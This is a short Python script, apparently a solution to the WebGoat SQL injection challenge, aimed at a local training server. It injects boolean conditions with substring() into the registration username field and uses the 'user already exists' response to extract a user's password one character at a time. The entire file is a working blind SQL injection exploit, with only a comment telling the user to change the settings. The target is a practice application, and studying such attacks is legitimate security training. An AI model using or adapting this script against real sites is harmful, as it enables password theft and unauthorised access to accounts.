import requests
import json
from string import digits, ascii_letters, punctuation

"""
需要自己改
"""
base_url = "http://10.1.121.141:8080"
cookie = {"JSESSIONID":"CA022FA656A2740E47503559256EB92D"}

relative_url = "/WebGoat/SqlInjection/challenge"
test_set = digits + ascii_letters + punctuation
email = '1234546@qq.com'
password = '123456'
password_fields = ['passwd', 'password']
password_field = "password"
guess = ""
result = ""

def guess_pw(guess, password_field, digit):
    username_tmp = f"tom' AND substring({password_field}, {digit}, 1) = '{guess}';--"
    params = {
        'username_reg': username_tmp, 
        'email_reg': email, 
        'password_reg': password, 
        'confirm_password_reg': password
    }
    r = requests.put(url, cookies=cookie, data=params)
    result_json = r.json()
    feedback = str(result_json['feedback']).strip()
    check = (f"User {username_tmp} already exists please try to register with a different username.")
    if (feedback == check):
        return True
    

if __name__ == "__main__":
    url = base_url + relative_url
    for password_field in password_fields:
        for digit in range (1, 50):
            for guess in test_set:
                isRight = guess_pw(guess, password_field, digit)
                if isRight:
                    result += guess
                    print(guess, end="")
                    break
            else:
                if len(result) == 0:
                    print(f"{password_field} isn't the field")
                break
        if (len(result) < digit and len(result) > 0):
            break